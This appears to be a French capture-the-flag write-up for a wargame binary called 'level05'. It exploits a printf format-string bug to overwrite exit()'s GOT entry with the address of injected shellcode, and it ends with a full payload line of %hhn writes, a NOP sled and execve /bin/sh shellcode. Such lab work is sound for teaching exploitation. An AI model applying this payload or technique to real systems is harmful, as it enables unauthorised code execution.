@@ -1,0 +1,28 @@
+-- level05 --
+Dans cet exo il y a un fgets(s, 100, stdin) dans un char[100],
+puis un printf(s) de notre buffer, exploitable.
+Cependant il y a plusieurs obstacles qui compliquent l'exploitation de la faille:
+D'une part on exit(0) juste apres le printf. On ne va donc pas ecraser la sauvegarde d'eip mais plutot l'adresse d'exit dans la got.
+Ensuite une sorte de tolower est appliquee a toutes les valeurs comprises entre 'A' et 'Z' contenues dans la string. Cependant ces valeurs sont verifiees lors d'un parcours de la string jusqu'au premier '\0' recontre.
+On peut donc ecrire nos adresses a ecraser grace au printf, les valeurs qu'on veut y mettre, puis un '\0' et enfin un shellcode. On ecrasera l'adresse d'exit dans la got par l'adresse du shellcode afin de jump dessus.
+Avec gdb on trouve que l'adresse d'exit va etre recuperee a 0x080497e0. Ce sera donc notre premiere chose a ecrire dans l'input. Pour faire ca proprement, on va modifier byte par byte et donc ecrire
+0x080497e0
+0x080497e1
+0x080497e2
+0x080497e3
+On va ensuite mettre le padding et les %n pour ecrire a ces adresses. On visera l'adresse ou est place notre shellcode.
+On rappelle que 100 caracteres de notre entree sont pris en compte. Une fois toute la chaine creee, on a la place de mettre environ 10 NOP et notre shellcode de 28 bytes. Nos NOP vont etre situes a 0xffffd6c1. On va jump a 0xffffd6c8.
+On doit donc ecrire les 4 adresses des 4 bytes de l'adresse de exit() dans la got a modifier:
+"\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe1"[::-1] + "\x08\x04\x97\xe2"[::-1] + "\x08\x04\x97\xe3"[::-1]
+Ensuite, le padding et les %n pour ecrie 0xffffd6c8 a ces adresses.
+En affichant beaucoup de %X, on trouve que nos adresses sont situes a la 10e, 11e, 12e et 13e adresses sur la stack du printf.
+On ecrit dans l'ordre croissant des valeurs
+0xc8 a 0x080497e0
+0xd6 a 0x080497e1
+0xff a 0x080497e2
+0xff a 0x080497e3
+Cela nous fait comme padding et %n, sachant qu'avec les 4 adresses 16 bytes on deja ete ecris:
+"%184d" + "%10$hhn" + "%14d" + "%11$hhn" + "%41d" + "%12$hhn" + "%13$hhn"
+Enfin, on n'oublie pas le \0 car sinon le programme va tolower() les valeurs de notre shellcode, puis on peut mettre 10 NOP et le shellcode
+Cela donne au total en gardant stdin ouvert:
+cat <(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe1"[::-1] + "\x08\x04\x97\xe2"[::-1] + "\x08\x04\x97\xe3"[::-1] + "%184d" + "%10$hhn" + "%14d" + "%11$hhn" + "%41d" + "%12$hhn" + "%13$hhn" + "\x00" + "\x90"*10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"') - | ./level05
